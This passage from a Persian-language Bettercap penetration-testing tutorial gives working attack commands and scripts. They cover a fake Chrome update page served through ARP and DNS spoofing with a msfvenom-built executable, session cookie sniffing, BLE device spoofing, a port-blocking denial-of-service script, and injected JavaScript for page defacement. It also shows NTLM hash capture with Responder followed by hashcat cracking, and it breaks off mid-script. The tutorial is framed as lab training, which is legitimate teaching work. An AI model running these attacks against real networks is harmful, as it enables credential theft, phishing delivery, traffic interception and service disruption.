using System.Windows.Forms;

class TestUpdater {
    static void Main() {
        MessageBox.Show("This is test message.\n\n In real world this message not showing and malware run in the background.", 
                        "Windows Update Simulator",
                        MessageBoxButtons.OK, 
                        MessageBoxIcon.Information);
    }
}
'@

#Save Source Code (ذخیره کد منبع)
$SourceCode | Out-File -FilePath "C:\Temp\test_updater.cs"

#کامپایل با استفاده از کامپایلر سی شارپ ویندوز
#Compile using Microsoft (R) Visual C# Compiler version
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:winexe /out:C:\Temp\ChromeUpdate.exe C:\Temp\test_updater.cs

Write-Host "Executable File Create => C:\Temp\ChromeUpdate.exe"
```

1. **پیش نیاز اول - روش دوم** ساخت فایل اجرایی `ChromeUpdate.exe` روش دوم با `MSFVenom`
	1. در مثال اول با استفاده از `MSFVenom` یک فایل exe میسازیم که صرفاً یک پیام نشان را دهد.
	2. در مثال دوم نیز با استفاده از `MSFVenom` یک فایل exe میسازیم که ماشین حساب ویندوز (`calc.exe`) را باز میکند.
```sh
#Example 1: Simple EXE file to show a message box using MSFVenom
msfvenom -p windows/messagebox TEXT="This is a Pentest. in Real World Scenario Malware Installed." TITLE="Security Test" -f exe -o /var/www/phishing/ChromeUpdate.exe

#Example 2: Create a EXE file which Run Windows Calculator using MSFVenom
msfvenom -p windows/exec CMD=calc.exe -f exe -o /var/www/phishing/ChromeUpdate.exe
```
- **هشدار امنیتی:** 
	- فایل‌های تولید شده توسط MSFVenom توسط آنتی‌ ویروس‌ ها شناسایی می‌شوند. این فایل‌ها **فقط و فقط** برای اهداف آموزشی در محیط‌های ایزوله آموزشی / آزمایشگاهی طراحی شده‌ اند. هرگونه استفاده از آن‌ها در شبکه‌ های واقعی غیرقانونی و به دور از اخلاق حرفه ای است.

2. **پیش نیاز دوم:** ساخت `index.html` صفحه HTML برای دانلود خودکار فایل EXE
```html
<!-- File: /var/www/phishing/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Chrome Update</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .update-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
        }
        .chrome-logo {
            width: 64px;
            height: 64px;
            margin-bottom: 20px;
        }
        h1 {
            color: #202124;
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: #5f6368;
            margin-bottom: 20px;
        }
        .progress-bar {
            width: 100%;
            height: 8px;
            background-color: #e0e0e0;
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 20px;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background-color: #1a73e8;
            animation: progress 3s ease-in-out forwards;
        }
        @keyframes progress {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
        }
        .status {
            color: #5f6368;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="update-container">
        <img src="https://www.google.com/chrome/static/images/chrome-logo-m100.svg" 
             alt="Chrome Logo" class="chrome-logo" 
             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI0MCIgZmlsbD0iIzFhNzNlOCIvPjx0ZXh0IHg9IjUwIiB5PSI2NSIgZm9udC1zaXplPSI0MCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiPkNIPC90ZXh0Pjwvc3ZnPg=='">
        <h1>Google Chrome Update</h1>
        <p>A critical security update is available for your browser.<br>Downloading automatically...</p>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        <p class="status">Please wait while the update is being installed...</p>
    </div>

    <script>
        // Automatic Download after 2 Second
        // دانلود خودکار پس از ۲ ثانیه
        setTimeout(function() {
            var link = document.createElement('a');
            link.href = 'ChromeUpdate.exe';
            link.download = 'ChromeUpdate.exe';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            // Update Status (به‌روزرسانی وضعیت)
            document.querySelector('.status').textContent = 'Update downloaded. Installing...';
        }, 2000);
    </script>
</body>
</html>
```

3. **پیش نیاز سوم:** انتقال فایل ها به مسیر مشخص و تنظیم مجوز های لازم
```sh
#Copy files into fake server path
#قرار دادن فایل‌ها در مسیر صحیح
sudo mkdir -p /var/www/phishing
sudo cp ChromeUpdate.exe /var/www/phishing/
sudo cp index.html /var/www/phishing/

#Set Suitable Permissions (تنظیم مجوزهای مناسب)
sudo chmod 755 /var/www/phishing/
sudo chmod 644 /var/www/phishing/ChromeUpdate.exe
sudo chmod 644 /var/www/phishing/index.html
```
-----

**گام‌های پیاده‌سازی:**
5. **مرحله اول: اجرای ARP Spoofing**
```sh
sudo bettercap -iface eth0
set arp.spoof.targets 192.168.1.5
arp.spoof on
```

2. **مرحله دوم: فعال‌سازی DNS Spoofing**
```sh
set dns.spoof.domains update.googleapis.com, dl.google.com
set dns.spoof.address 192.168.1.99  #Pentester IP
dns.spoof on
```

3. **مرحله سوم: فعال‌سازی وب سرور داخلی**
```sh
set http.server.path /var/www/phishing
set http.server.port 80
http.server on
```
- **نتیجه:** 
	- اکنون هنگامیکه کاربر وارد update.googleapis.com شود، در واقع به سرور تست نفوذگر منتقل میشود که فایل `index.html` در مسیر `/var/www/phishing` اجرا میشود و فایل اجرایی `/var/www/phishing/ChromeUpdate.exe` را دانلود میکند.

4. **مرحله چهارم: نظارت بر نتایج**
```sh
events.stream on
```

- **Cheat-sheet(Run Server and Pentest):**
```sh
#1-Copy files to fake server path
sudo mkdir -p /var/www/phishing
sudo cp ChromeUpdate.exe /var/www/phishing/
sudo cp index.html /var/www/phishing/

#2-Set suitable permisiions
sudo chmod 755 /var/www/phishing/
sudo chmod 644 /var/www/phishing/ChromeUpdate.exe
sudo chmod 644 /var/www/phishing/index.html

#3-Run Bettercap
sudo bettercap -iface eth0

#4-In Bettercap:
set arp.spoof.targets 192.168.1.5
arp.spoof on
set dns.spoof.domains update.googleapis.com, dl.google.com
set dns.spoof.address 192.168.1.99  #Pentester IP
dns.spoof on
set http.server.path /var/www/phishing
set http.server.port 80
http.server on
events.stream on
```
###### Attack 10: Session Cookies Hijacking with Transparent Proxy
- **توضیحات:**
	- **هدف:** استخراج کوکی‌ های احراز هویت (Session Cookies) از ترافیک HTTP برای دور زدن کامل فرایند لاگین. این روش به مهاجم اجازه می‌دهد بدون نیاز به نام کاربری و رمز عبور، وارد حساب کاربری هدف شود.
	- **پیش‌نیازها:** هیچ.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** راه‌ اندازی MITM کامل
```sh
sudo bettercap -iface eth0
set arp.spoof.targets 192.168.1.5
arp.spoof on
```

2. **مرحله دوم:** فعال‌ سازی Proxy و HTTP Sniffing
```sh
sudo bettercap -iface eth0
set arp.spoof.targets 192.168.1.5
arp.spoof on
```

3. **مرحله سوم:** فعال‌ سازی نمایش زنده کوکی‌ ها:
```sh
set events.stream.filter http.request
events.stream on
```
در خروجی، `Cookie` درخواست‌ های HTTP نمایش داده می‌شود.
###### Attack 11: BLE Spoofing (Attack to IOT Devices)
- **توضیحات:**
	- **هدف:** جعل یک دستگاه BLE مورد اعتماد (مانند یک قفل هوشمند یا تگ ردیابی) برای فریب دستگاه هدف.
	- **پیش‌نیازها:** 
		1. یک آداپتور بلوتوث سازگار.
		2. فعال بودن REST API
			- ماژول `ble.spoof` در حال حاضر در نسخه‌های استاندارد Bettercap وجود ندارد. این قابلیت صرفاً از طریق API و به صورت تجربی در برخی نسخه‌های توسعه‌دهنده قابل دسترسی است. بنابراین، برای انجام حملات BLE بوسیله این ماژول باید از REST API استفاده کنیم.

**گام های پیش‌نیاز:**
1. **پیش‌نیاز اول:** فعال کردن REST API
```sh
#one liner command to enable REST API
sudo bettercap -iface wlan0 -eval 'api.rest on'

#or using normal method
sudo bettercap -iface wlan0
api.rest on

#Test API Connection
curl http://127.0.0.1:8083/api/session
#Show BLE Devices using API
curl http://127.0.0.1:8083/api/ble.devices
```

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** شناسایی دستگاه BLE هدف
```sh
sudo bettercap -iface wlan0
ble.recon on
ble.show
#Discovering MAC Address and Name of Target Device(Example: `SmartLock-1A2B`)
#شناسایی آدرس مک و نام دستگاه هدف(مثلا `SmartLock-1A2B`)

#Output Example:
#┌───────────────┬───────────────────┬─────────┬────────┐
#│      MAC      │       Name        │  RSSI   │ Vendor │
#├───────────────┼───────────────────┼─────────┼────────┤
#│ AA:BB:CC:DD:EE│ SmartLock-1A2B    │   -45   │ Nordic │
#└───────────────┴───────────────────┴─────────┴────────┘
```

2. **مرحله دوم:** جعل هویت دستگاه (نیاز به اسکریپت سفارشی):
	- ابزار Bettercap قابلیت جعل BLE را از طریق API دارد. یک کامند ساده `curl`:
```sh
curl -X POST http://127.0.0.1:8083/api/ble.spoof -d '{"mac":"AA:BB:CC:DD:EE:FF","name":"SmartLock-1A2B"}'
```
این دستور با استفاده از REST API  ماژول `ble.spoof` را در Bettercap با داده های ارسال شده فعال و استفاده میکند و در نتیجه آن یک دستگاه BLE جعلی با مشخصات ارسال شده ساخته میشود.

- **پس از اجرا و ساخت دستگاه BLE جعلی:**
	- پس از اجرای موفق اسکریپت، دستگاه جعلی در شبکه BLE ظاهر می‌شود. بسته به نوع حمله، مراحل بعدی می‌تواند شامل موارد زیر باشد:
	- **فریب دستگاه هدف:** اگر دستگاه هدف به دنبال اتصال به `SmartLock-1A2B` باشد، ممکن است به دستگاه جعلی شما متصل شود.
	- **رهگیری ترافیک BLE:** با استفاده از `ble.recon on` و تحلیل بسته‌ها، می‌توان ارتباطات بین دستگاه‌ها را بررسی کرد.
	- **اجرای حملات لایه بالاتر:** پس از برقراری ارتباط، می‌توان از پروتکل‌های GATT برای خواندن/نوشتن مشخصه‌ها استفاده کرد.
		**نکته مهم:** این حمله تنها در صورتی موفق است که دستگاه هدف، احراز هویت قوی روی اتصالات BLE اعمال نکرده باشد.
------------

- **نکته تکمیلی:** اسکریپت BASH برای پیاده سازی BLE Spoofing از صفر تا صد
	- این اسکریپت تست نفوذ BLE Spoofing را بصورت کامل و اتوماتیک از صفر شبیه سازی میکند.
	- ابزار را اجرا میکند، ماژول ها را بررسی میکند و درصورت غیر فعال بودن آنها را فعال میکند. در آخر نیز اطلاعات دستگاه جعلی BLE ساخته شده را چاپ میکند.
```sh
#!/bin/bash
#File: ble_spoof.sh
#Script for Automatic BLE Spoofing using Bettercap API

#Usage: sudo bash ble_spoof.sh <MAC_ADDRESS> <DEVICE_NAME>

#Check Input Parameters (بررسی پارامترهای ورودی)
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <MAC_ADDRESS> <DEVICE_NAME>"
    echo "Example: $0 AA:BB:CC:DD:EE:FF SmartLock-1A2B"
    exit 1
fi

TARGET_MAC="$1"
DEVICE_NAME="$2"
API_URL="http://127.0.0.1:8083/api"

#Function of sending request to REST API
#تابع برای ارسال درخواست به REST API
send_api_request() {
    local endpoint="$1"
    local data="$2"
    curl -s -X POST "${API_URL}/${endpoint}" \
        -H "Content-Type: application/json" \
        -d "${data}" > /dev/null 2>&1
}

echo "[*] Start BLE Spoofing..."
echo "Target MAC Address: ${TARGET_MAC}"
echo "Device Name: ${DEVICE_NAME}"

#Check Bettercap running or Not
#بررسی اینکه ابزار در حال اجراست یا نه
if ! curl -s "${API_URL}/session" > /dev/null 2>&1; then
    echo "[!] Error: Bettercap not started or Bettercap REST API Disabled"
    echo "Please run Bettercap using below command:"
    echo "    sudo bettercap -iface wlan0 -eval 'api.rest on; ble.recon on'"
    exit 1
fi

#Enable ble.recon Module(if not enabled)
#فعال‌سازی ماژول (اگر فعال نیست)
echo "[*] Enable BLE Recon Module(ble.recon) ..."
send_api_request "ble.recon" '{"action":"on"}'

#Start Scanning nearby BLE devices
#شروع اسکن اطراف برای شناسایی دستگاه‌های موجود
echo "[*] Scanning nearby BLE devices"
sleep 3

#Send Fake BLE Packets(requests) (ارسال درخواست جعل)
echo "[*] Send Fake BLE Packets(requests)..."
send_api_request "ble.spoof" "{\"mac\":\"${TARGET_MAC}\",\"name\":\"${DEVICE_NAME}\"}"


#Confirm Operation is Successes and print Fake BLE Device Info
#تأیید موفقیت عملیات و چاپ اطلاعات دستگاه جعلی
echo "[+] BLE Spoofing Successfully Completed and Show in network, Fake Device Information:"
echo ""
echo "Fake Device Name: '${DEVICE_NAME}'"
echo "Fake MAC Address '${TARGET_MAC}'."
echo ""
echo "[*] Notes:"
echo "[*]-1: Until Bettercap Running, this fake device enable and show in the network"
echo "[*]-2: When Bettercap is Closed fake BLE device is death"

```

- **اجرای اسکریپت:**
```sh
#Terminal 1: Run Bettercap with Enabled REST API
sudo bettercap -iface wlan0 -eval "api.rest on; ble.recon on"

#Terminal 2: Run script from Another terminal 
#در ترمینال دیگر، اسکریپت را اجرا کنید
chmod +x ble_spoof.sh
sudo bash ble_spoof.sh AA:BB:CC:DD:EE:FF "SmartLock-1A2B"
```
###### Attack 12: Extract Information from Social Networks using URL Sniffing
- **توضیحات:**
	- **هدف:** مشاهده و بدست آوردن لینک‌ های خصوصی، پیام‌ ها و محتوای به اشتراک‌ گذاشته‌ شده در شبکه‌ های اجتماعی که از HTTP استفاده می‌کنند.
	- **پیش‌نیازها:** MITM فعال.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** اجرای MITM
```sh
sudo bettercap -iface eth0
set arp.spoof.targets 192.168.1.5
arp.spoof on
```

2. **مرحله دوم:** فعال‌ سازی پراکسی HTTP و Event Filtering(فیلتر رویدادها)
```sh
http.proxy on
set events.stream.filter http.request
events.stream on
```

3. **مرحله سوم:** تحلیل خروجی
	1. هر درخواست GET یا POST که شامل URL های طولانی و پارامتر های حساس باشد، در کنسول چاپ می‌شود. این می‌تواند شامل لینک‌ های اشتراک‌گذاری خصوصی، توکن‌های موقت و پیام‌ ها باشد.
###### Attack 13: Port and Service Blocking
- **توضیحات:**
	- **هدف:** 
		- جلوگیری از دسترسی هدف به یک سرویس خاص با Drop کردن بسته‌های مربوطه. 
	- **کارکرد:**
		- هر سرویس/پروتکل با استفاده از یک پورت خدمات رسانی خود را انجام میدهد. 
		- در این حمله با ترکیب دو مکانیزم خدمات رسانی یک سرویس / پروتکل را مختل میکنیم: 
			1. ابتدا با ARP Spoofing کاری میکنیم که ترافیک هدف از مهاجم عبور کند.
			2. سپس با TCP Proxy ترافیک را به آدرس نامعتبر هدایت میکنیم.
			3. نهایتا از آنجا که آدرس نامعتبر است، بسته Drop می‌شود.
	- **پیش‌نیازها:** MITM فعال.
	- **نکته:**
		- برای اینکه استفاده از Caplet ها را نیز تمرین کنیم، این تست نفوذ را با استفاده از Caplet پیاده سازی میکنیم.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** ساخت فایل Caplet در `/root/block_port.cap`
	- این فایل Caplet پورت را از طریق دو مکانیزم ترکیبی مسدود می‌کند:
	1. **مکانیزم اول: ARP Spoofing (رهگیری ترافیک)**
		- با ارسال بسته‌های ARP جعلی، تمام ترافیک هدف به گیت‌وی را از کارت شبکه مهاجم عبور می‌دهد.
	2. **مکانیزم دوم: TCP Proxy با آدرس نامعتبر (Drop عملی)**
		- خط `set tcp.proxy.port 443` مشخص می‌کند که ترافیک مقصد پورت 433 را رهگیری کند.
		- خط `set tcp.proxy.address 127.0.0.1:1` ترافیک رهگیری شده را به پورت 1 لوکال‌هاست (که سرویسی روی آن اجرا نمی‌شود و آدرسی نامعتبر است) هدایت می‌کند.
	3. **نتیجه:**
		1. بسته‌های HTTPS به جای رسیدن به مقصد اصلی، به یک پورت بسته هدایت شده و عملاً Drop می‌شوند.
	4. **نکته:**
		1. اگر بخواهیم کارایی سرویس دیگری را مسدود کنیم، کافیست شماره پورت سرویس را بجای 443 بنویسیم. مثلا 22 برای SSH، 53 برای DNS و یا 21 برای FTP  
```sh
#File: block_port.cap
#Block Access to Port 433(HTTPS) for Specific Target
#Save this file into: /root/block_port.cap

#Set Interface (تنظیم اینترفیس)
set iface eth0

#Set ARP Spoofing Target (تنظیم آیپی هدف)
set arp.spoof.targets 192.168.1.5

#Enable ARP Spoofing (فعالسازی ماژول ARP Spoofing)
#ARP Spoofing forces target traffic through attacker
#باعث می‌شود ترافیک هدف از مهاجم عبور کند
arp.spoof on

#Set TCP Proxy for blocking 443(HTTPS) - TCP Proxy redirects traffic to invalid address
#تنظیم پراکسی برای مسدودسازی - هر اتصال به پورت 443 به یک پورت غیرمعتبر هدایت می‌شود
set tcp.proxy.port 443
set tcp.proxy.address 127.0.0.1:1 #Invalid Address(آدرسی نامعتبر)
tcp.proxy on

#Show Status (نمایش وضعیت)
events.stream on
```
- **نتیجه:**
	- این کار تمام اتصالات به پورت 443 را که توسط هدف آغاز می‌شود، متوقف می‌کند و در نتیجه پروتکل HTTPS را بطور کامل در سیستم تارگت غیرفعال میکند.

2. **مرحله دوم:** اجرای Bettercap با فایل Caplet
```sh
#Method 1: Directo use from -caplet flag
sudo bettercap -iface eth0 -caplet /root/block_port.cap

#Method 2: Loading from Bettercap Shell
sudo bettercap -iface eth0
caplet /root/block_port.cap

```

- **روش اضافه:** اجرای حمله بدون استفاده از Caplet
```sh
sudo bettercap -iface eth0

#In Bettercap; Set ARP Spoofing target
set arp.spoof.targets 192.168.1.5
arp.spoof on

#Set TCP Proxy for blocking 443(HTTPS), redirect HTTPS Traffic to invalid Address
set tcp.proxy.port 443
set tcp.proxy.address 127.0.0.1:1  #Invalid Address
tcp.proxy on

#Show Status
events.stream on
```

- **تکمیلی:** اسکریپت Bash برای Service Blocking
	- این اسکریپت تست نفوذ Service Blocking یعنی مسدود سازی سرویس‌ های خاص برای اهداف مشخص را بصورت اتوماتیک از صفر تا صد پیاده سازی میکند.
```sh
#!/bin/bash
#File: service_blocker.sh
#this script block specific Services for specific Targets
#Usage Guide: sudo bash service_blocker.sh <TARGET_IP> <PORT>

TARGET_IP="$1"
BLOCK_PORT="$2"
#Set Target IP based on your network
GATEWAY_IP="192.168.1.1" 
INTERFACE="eth0"

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <TARGET_IP> <PORT>"
    echo "Example: $0 192.168.1.5 443  # Blocking HTTPS"
    echo "Example: $0 192.168.1.5 22 # Blocking SSH"
    exit 1
fi

echo "[*] Start Service Blocking ..."
echo "Target IP: ${TARGET_IP}"
echo "Blocked Port: ${BLOCK_PORT}"

#First: Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

#Second: Create Caplet File(Temporarily)
CAPLET_FILE="/tmp/block_${BLOCK_PORT}.cap"
cat > "${CAPLET_FILE}" << EOF
#Filter to Blocking Port: ${BLOCK_PORT}
set arp.spoof.targets ${TARGET_IP}
arp.spoof on

#Blocking Port
set tcp.proxy.port ${BLOCK_PORT}
set tcp.proxy.address 127.0.0.1:1
tcp.proxy on

#Show Event
events.stream on
EOF

#Third: Run Bettercap with Customized Caplet
echo "[*] Run Bettercap with Customized Caplet..."
sudo bettercap -iface "${INTERFACE}" -caplet "${CAPLET_FILE}"

#Fourth: Cleaning (Run when Pressing CTRL+C)
echo "[+] Operation Stopped by User."
echo "[+] Caplet File Removed."
rm -f "${CAPLET_FILE}"
```
- **روش استفاده از اسکریپت:**
```sh
#Set Executable Permission for Script (قابل اجرا کردن اسکریپت)
chmod +x service_blocker.sh

#Blocking 443-HTTPS (مسدود سازی پورت 433 پروتکل HTTPS)
sudo bash service_blocker.sh 192.168.1.5 443

#Blocking 25-SMTP(email service) (مسدود سازی پورت 25 پروتکل SMTP)
sudo bash service_blocker.sh 192.168.1.5 25
```
###### Attack 14: Web Defacement Attack (Changing Web Pages Content)
- **توضیحات:**
	- **هدف:** جایگزینی یک تصویر خاص (مثلا `logo.png`) در یک وبسایت با یک تصویر دلخواه، و یا تغییر متن های استفاده شده در یک وبسایت
	- **پیش‌نیازها:** MITM فعال و یک وب سرور برای میزبانی تصویر جدید.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** ایجاد اسکریپت جایگزینی `replace_logo.js`
```javascript
var images = document.querySelectorAll('img[src*="logo.png"]');
for (var i = 0; i < images.length; i++) {
    images[i].src = 'http://192.168.1.99/hacked_logo.png';
}
```

2. **مرحله دوم:** اجرای Bettercap و تزریق اسکریپت
```sh
sudo bettercap -iface eth0
set arp.spoof.targets 192.168.1.5
arp.spoof on
set http.proxy.script /path/to/replace_logo.js
http.proxy on
```
حال هرگاه هدف سایتی را ببیند که `logo.png` دارد، لوگوی جدید را بجای آن مشاهده خواهد کرد.
###### Attack 15: NTLM Relay via LLMNR/NBT-NS Spoofing
- **توضیحات:**
	- **هدف:** دریافت Hash احراز هویت NTLM ویندوز با جعل پروتکل‌ های NetBIOS و LLMNR.
	- **پیش‌نیازها:** ابزار Responder (معرفی کامل در توضیحات تکمیلی)
		- ابزاری قدرتمند برای جمع آوری Credentials های احراز هویت ویندوز (مثلا NTLM Hashes) با جعل پروتکل های Name Resolution(مانند LLMNR،NBT-NS و MDNS)

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** فعال‌سازی جعل LLMNR و NetBIOS
```sh
sudo bettercap -iface eth0
set net.probe.nbns true
set net.probe.mdns true
net.probe on
```

2. **مرحله دوم:** فعال‌سازی سرور SMB جعلی (با ابزار جانبی Responder):
```sh
#Combine Bettercap with Responder
sudo responder -I eth0 -wrf
```
ابزار Bettercap شبکه را برای این درخواست‌ ها اسکن کرده و Responder پاسخ‌ های جعلی ارسال می‌کند.
- **فلگ های Responder:**
	- `-I eth0` معرفی اینترفیس شبکه
	- `-w`: فعال‌ سازی سرور جعلی WPAD
	- `-r`: فعال‌ سازی NetBIOS Redirect
	- `-f`: فعال‌ سازی Fingerprinting
	- خروجی در مسیرهای زیر ذخیره می‌شود:
		- `/usr/share/responder/logs/SMB-NTLMv2-*.txt`
		- `/usr/share/responder/logs/HTTP-NTLMv2-*.txt`

3. **مرحله سوم:** کرک کردن هش های یافت شده با ابزار هایی مانند `hashcat` یا `john`
	- هش‌ها(Hashes) و اعتبار نامه (Credentials) های جمع‌آوری شده توسط Responder را می‌توان با ابزارهایی مانند `hashcat` یا `john` کرک کرد.
	- تکنیک های کرک برای هر نوع از هش متفاوت میباشد و در زیر فقط روشی را برای نمونه ذکر میکنیم.
```sh
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```
----------

**توضیحات تکمیلی:**
- **مفاهیم WPAD, Fingerprinting, NetBIOS Redirect**
	1. **سرور WPAD (Web Proxy Auto-Discovery Protocol):**
		1. تعریف: WPAD پروتکلی است که به مرورگرها و سیستم‌عامل‌ها اجازه می‌دهد به‌طور خودکار تنظیمات پراکسی را از طریق DNS یا DHCP کشف کنند.
		2. کاربرد در Responder: ابزار Responder با جعل یک سرور WPAD، به کلاینت‌ها یک فایل `wpad.dat` مخرب ارائه می‌دهد که آنها را مجبور می‌کند تمام ترافیک خود را از پراکسی مهاجم عبور دهند.
		3. اهمیت امنیتی: بسیاری از سازمان‌ها از WPAD استفاده می‌کنند، اما پیکربندی نادرست آن می‌تواند به مهاجم اجازه دهد تمام ترافیک وب سازمان را رهگیری کند.
	2. **فرآیند Fingerprinting:**
		1. تعریف: Fingerprinting فرآیند شناسایی سیستم‌ عامل، نسخه سرویس‌ ها، و پیکربندی دستگاه هدف از طریق تحلیل الگوهای پاسخگویی آن است.
		2. عملکرد در Responder: با استفاده از فلگ `- f` ابزار Responder فرآیند Fingerprinting انجام میدهد و بسته‌ های SMB و HTTP دریافتی را تحلیل کرده و اطلاعاتی را از NTLM Hashes ها استخراج میکند.
		3. اطلاعاتی مانند:
			- نسخه ویندوز (Windows 10, Windows Server 2019)
			- نسخه مرورگر (Chrome, Firefox, Edge)
			- نام کامپیوتر و دامنه
	3. **تکنیک NetBIOS Redirect:**
		1. تعریف: NetBIOS Redirect تکنیکی است که در آن، مهاجم به جای پاسخ مستقیم به درخواست‌ های NetBIOS، آنها را به یک سرور دیگر (معمولاً خودش) هدایت می‌کند.
		2. عملکرد در Responder با فعال‌سازی فلگ `-r`، ابزار Responder به جای پاسخ دادن به Query های NBT-NS با IP خودش، یک پیام Negative Response همراه با Redirect ارسال می‌کند. این کار باعث می‌شود کلاینت ویندوزی مجبور شود دوباره از طریق SMB به سرور مهاجم متصل شود و اعتبارنامه خود را ارائه دهد.

- **معرفی ابزار Responder**
	- **توضیحات:**
		- یک ابزار قدرتمند و تخصصی برای حملات MITM در شبکه‌های ویندوزی است که توسط Laurent Gaffié توسعه یافته است. 
		- این ابزار با جعل پروتکل‌های سرویس‌ دهی نام (Name Resolution) مانند LLMNR،NBT-NS و MDNS، می‌تواند Credentials (اعتبارنامه‌) های احراز هویت (مانند NTLM Hashed) را از دستگاه‌ های ویندوزی موجود در شبکه جمع‌آوری کند.
	- **چرا Responder مهم است؟**
		- در شبکه‌های ویندوزی، هنگامی که یک دستگاه نمی‌تواند Hostname(نام میزبان) مورد نظر را از طریق DNS پیدا کند، از پروتکل‌های LLMNR و NetBIOS برای پرس‌ و جو در شبکه استفاده می‌کند. 
		- ابزار Responder به این پرس‌ و جوها پاسخ جعلی می‌دهد و خود را به عنوان مقصد معرفی می‌کند. 
		- سپس دستگاه هدف با ارسال درخواست احراز هویت (NTLM Authentication) به Responder، هش رمز عبور خود را افشا می‌کند.
	- **کاربرد های اصلی:**
		1. جمع‌آوری NTLM Hashes: دریافت و ذخیره هش‌ های NTLM v1/v2 برای کرک آفلاین
		2. رله SMB Relay: رله کردن احراز هویت به دستگاه دیگر برای دریافت دسترسی غیرمجاز
		3. جعل WPAD Spoofing: جعل تنظیمات Proxy برای هدایت ترافیک
		4. ضبط HTTP/HTTPS Credential: دریافت اطلاعات ورود ارسالی به و‌بسایت‌ ها
	1. **نکات مهم در استفاده از Responder:**
		- محیط آزمایشگاهی: Responder را فقط در شبکه‌ های ایزوله، محیط های آموزشی / آزمایشگاهی و دارای مجوز اجرا کنید.
		- تشخیص: بدلیل سلسله رفتار مشخص بسیاری از سیستم‌های EDR و آنتی‌ویروس، Responder را شناسایی می‌کنند.
###### Attack 16: Bypassing Geographic Limitations (Geo-Block Bypassing)
- **توضیحات:**
	- **هدف:** تغییر پاسخ یک و‌سایت که محتوای متفاوتی بر اساس کشور کاربر نمایش می‌دهد.
	- **مکانیزم و روش کارکرد:**
		- وبسایت‌ها معمولاً موقعیت جغرافیایی کاربر را از طریق یکی از روش‌ های زیر تشخیص می‌دهند:
		1. **آدرس IP مبدأ:** رایج‌ترین روش. سرور با استفاده از پایگاه‌های داده Geo IP، کشور کاربر را تشخیص می‌دهد.
		2. **هدر Accept-Language:** مرورگر زبان‌ های ترجیحی کاربر را ارسال می‌کند.
		3. **هدرهای سفارشی CDN:** سرویس‌ هایی مانند Cloudflare هدرهایی مانند `CF-IPCountry` اضافه می‌کنند.
		4. **زمان محلی (Time-Zone):** از طریق جاوا اسکریپت قابل تشخیص است.
		- بنابراین برای رسیدن به هدف این حمله، یعنی دریافت محتوای متفاوت بر اساس کشور کاربر باید بر اساس روشی که وبسایت هدف محل کاربر را تشخیص میدهد عمل کنیم. 
		- اگر وبسایت بر اساس آدرس آیپی محل کاربر را تشخیص میدهد باید تغییراتی را در آیپی اعمال کنیم(استفاده از VPN, Proxy) و یا اگر وبسایت بر اساس هدر `Accept-Language` محل کاربر را تشخیص میدهد باید تغییراتی را در این هدر اعمال کنیم(توسعه ماژول سفارشی Bettercap)
	- **روش های پیاده سازی:**
		1. **روش ساده: با استفاده از جاوا اسکریپت سمت کلاینت**
			1. تاثیر: کم
			2. محدودیت: فقط روی AJAX/Fetch تأثیر دارد و روی درخواست‌ های اولیه صفحه که هدر ها قبلاً ارسال کرده اند هیچ تاثیری ندارد.
			3. مزیت: راه اندازی بسیار ساده
		2. **روش پیچیده: ماژول سفارشی Bettercap به زبان Go (راه‌حل کامل و حرفه‌ای)**
			1. تاثیر: بالا
			2. کارکرد: تغییر هدر `Accept-Language` در ترافیک عبوری
			3. چرایی استفاده: زیرا Bettercap امکان تغییر هدر های HTTP را از طریق امکانات داخلی و یا اسکریپت‌ های جاوا اسکریپت (که سمت کلاینت اجرا می‌شوند) ندارد.
			4. محدودیت: نیاز به توسعه و کامپایل دارد.
		3. **راه‌ حل جایگزین: استفاده از پراکسی واسط (Mitmproxy)**
			1. تاثیر: متوسط
			2. اگر توسعه ماژول Go پیچیده به نظر می‌رسد، می‌توان از Mitmproxy به عنوان پراکسی واسط استفاده کرد.
			3. محدودیت: ابزار اضافه
			4. مزیت: راه اندازی ساده با تاثیر مناسب
	- **پیش‌نیازها:** 
		1. ماژول MITM فعال
		2. فایل JavaScript برای روش پیاده سازی ساده
		3. فایل Golang ماژول سفارشی Bettercap برای روش پیاده سازی روش پیچیده
		4. ابزار Mitmproxy برای روش پیاده سازی راه حل جایگزین
-------------

**پیاده سازی روش ساده: با استفاده از جاوا اسکریپت سمت کلاینت**
1. **روش ساده - مرحله اول:** ساخت اسکریپت جاوا اسکریپت `geo_bypass.js`
```javascript
// File: /root/geo_bypass.js
// Target: Bypass geographic restrictions in target browser
// هدف: دور زدن محدودیت‌های جغرافیایی در مرورگر هدف

(function() {
    'use strict';
    
    console.log('[Geo Bypass] Active - Geographic Bypass Activated');
    
    // Override Navigator for Language Spoofing
    Object.defineProperty(navigator, 'language', {
        get: function() { return 'en-US'; },
        configurable: true
    });
    
